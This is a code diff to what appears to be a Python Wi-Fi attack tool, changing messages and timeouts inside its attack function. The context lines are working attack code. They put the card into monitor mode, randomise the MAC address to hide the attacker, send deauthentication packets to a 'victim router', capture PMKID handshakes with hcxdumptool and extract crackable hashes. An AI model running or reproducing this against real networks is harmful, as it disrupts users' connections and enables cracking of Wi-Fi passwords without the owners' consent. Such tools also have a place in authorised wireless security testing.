@@ -116,15 +116,15 @@ def check_deps():
 def attack_func(network_interface, attack_mode):
     time.sleep(1)
     subprocess.run(["clear"])
-    get_colours("\nSetting up network card...", "yellow")
+    get_colours("\n[*] Setting up network card...", "yellow")
     subprocess.run(["sudo", "airmon-ng", "start", network_interface], stdout=subprocess.DEVNULL)
-    get_colours("\nGenerating new Mac Address...", "cyan")
+    get_colours("\n[!] Generating new Mac Address...", "cyan")
     time.sleep(3)
     subprocess.run(["sudo", "ifconfig", network_interface + "mon", "down"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "macchanger", "-r", network_interface + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "ifconfig", network_interface + "mon", "up"], stdout=subprocess.DEVNULL)
 
-    get_colours("\nNew Mac Address Generated ", "blue")
+    get_colours("\n[*] New Mac Address Generated ", "blue")
     time.sleep(1)
     subprocess.run(["clear"])
     # HandShake Attack Mode
@@ -152,13 +152,12 @@ def attack_func(network_interface, attack_mode):
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
-        timer_total = 65
+        timer_total = 70
         timer_process = range(timer_total, 9, -1)
         for i in timer_process:
             get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
             sys.stdout.write("\033[F")  # Cursor up one line
             time.sleep(1)
-
         os.system('clear')
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         timer_process = range(9, 0, -1)
@@ -184,13 +183,14 @@ def attack_func(network_interface, attack_mode):
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         get_colours("[*] Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
+        get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(100)} Seconds", 'blue')
         get_colours("", "yellow")
         process = subprocess.Popen(
             ["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
         try:
-            process.wait(timeout=65)  # Time for the process
+            process.wait(timeout=100)  # Time for the process
         except subprocess.TimeoutExpired:
-            print('\n[!] Timed out - killing process ID - ', process.pid)
+            get_colours(f"\n[!] Timed out - killing process ID -  {Fore.BLUE + str(process.pid)}", 'red')
             process.kill()
         time.sleep(2)
         subprocess.run(["clear"])
@@ -201,7 +201,6 @@ def attack_func(network_interface, attack_mode):
         subprocess.run(["clear"])
         get_pkmid_hashes = subprocess.run(["sudo hcxpcaptool -z myHashes_PKMID Capture_PKMID"],
                                           capture_output=True, text=True, shell=True)
-        subprocess.run(["clear"])
         time.sleep(2)
         get_colours("\n[*] Trying getting hashes", "magenta")
         subprocess.run(["rm", "Capture_PKMID"])
